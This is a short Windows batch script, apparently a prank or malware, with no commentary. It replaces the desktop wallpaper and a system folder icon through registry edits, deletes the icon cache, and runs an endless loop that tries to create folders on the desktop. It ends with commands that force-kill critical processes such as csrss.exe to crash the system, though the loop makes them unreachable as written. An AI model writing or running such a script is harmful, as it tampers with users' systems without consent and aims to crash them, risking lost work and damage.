@echo off
:main
copy BG.png C:/Windows/36ACR6/SafeBG.png
copy mi.ico C:/Windows/36ACR6/BaiduCloud.ico
reg add "hkcu\control panel\desktop" /v wallpaper /d "C:/Windows/36ACR6/SafeBG.png" /f
RunDll32.exe USER32.DLL,UpdatePerUserSystemParameters
del %APPDATA%/IconCache.db
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v 3 /t REG_BINARY /d "C:/Windows/36ACR6/BaiduCloud.ico" /f
goto createF
:createF
cd %HOMEPATH%/Desktop/
md Are you OK?.../
goto createF
goto PING-S
:PING-S
ping 127.0.0.1 -n 6
goto bsod
:bsod
taskkill /f /im csrss.exe
taskkill /f /im System
taskkill /f /im dllhost.exe
taskkill /f /im /t csrss.exe
taskkill /f /im /t System
taskkill /f /im /t dllhost.exe
